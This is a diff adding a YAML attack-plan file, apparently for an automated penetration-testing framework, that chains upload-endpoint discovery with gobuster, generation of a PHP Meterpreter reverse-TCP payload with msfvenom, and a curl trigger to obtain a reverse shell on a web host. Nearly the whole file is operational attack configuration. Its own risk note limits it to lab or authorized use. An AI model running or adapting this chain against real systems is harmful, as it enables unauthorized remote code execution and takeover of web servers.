@@ -1,0 +1,55 @@
+# Mech-Unit attack intent — File upload → remote code execution.
+# Packages the upload chain: locate upload endpoint, stage a payload,
+# trigger it, catch the callback.
+id: web_rce_via_upload
+name: File Upload → RCE
+category: web
+operator_label: "Get a shell through a file upload endpoint"
+operator_description: >
+  Finds a file-upload endpoint, stages a payload, triggers it, and catches
+  a reverse connection. Devastating when uploads are unvalidated.
+outcome: "Remote code execution on the web host, or no upload path"
+grants: [host.exec, postex.shell]
+time_to_impact: tens-of-minutes
+noise: high
+risk_notes: >
+  Drops a live payload on the target and calls home. Lab/authorized use
+  strictly.
+
+preconditions:
+  - probe: tools_present
+    with: [msfvenom, curl]
+
+plan:
+  - step: find_upload
+    tool: gobuster_dir
+    args:
+      url: "http://{{ target.host }}"
+      wordlist: /usr/share/wordlists/dirb/common.txt
+      extensions: php,asp,aspx,jsp
+    max_wait: 1200
+    extracts:
+      upload_found: "(upload|attach)"
+    on_fail: warn
+
+  - step: stage_payload
+    tool: msfvenom_payload
+    args:
+      payload: php/meterpreter/reverse_tcp
+      lhost: "{{ target.lhost }}"
+      lport: 4444
+      format: raw
+      output: "{{ plan_dir }}/payload.php"
+    max_wait: 120
+
+  - step: trigger
+    tool: curl_request
+    args:
+      url: "http://{{ target.host }}/{{ target.upload_path }}"
+    max_wait: 60
+    on_fail: warn
+
+artifacts:
+  payload: "{{ plan_dir }}/payload.php"
+
+llm_required: false
